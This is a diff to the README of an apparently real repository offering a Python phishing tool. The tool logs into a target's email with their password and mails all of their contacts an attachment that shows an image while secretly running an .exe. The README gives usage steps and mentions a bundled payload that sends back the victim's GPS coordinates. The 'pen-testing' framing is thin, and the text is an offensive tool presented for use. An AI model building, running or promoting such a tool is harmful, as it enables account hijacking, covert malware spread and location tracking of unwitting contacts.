@@ -1,2 +1,4 @@
-# python-phishing
-A program, made in python, that allows you to input the target email and password before sending a customised message to everyone in their contacts with a hidden .exe as an attatchment
+# Python Phishing
+This repository contains a program, made in python, that allows you to input the target email and password before sending a customised message to everyone in their contacts with a hidden .exe as an attatchment. This could be used for many pen-testing purposes and can be easily modified.
+
+To use, first modify the files: for message.txt, add the message you wish to send in the email. Then, follow the instructions in [FILE.md](FILE.md) to create your attatchment. Next, run the program and enter the target email and password. Once you have done this, the program will send the message to all email contacts, and any that download and open the attatchment will see an image open but will also run the .exe in the background. An example attatchment has been included which executes the [Borealis](https://github.com/LindenLaboratory/Borealis/tree/main) Choir software on a computer and sends back the computer's gps coordinates.
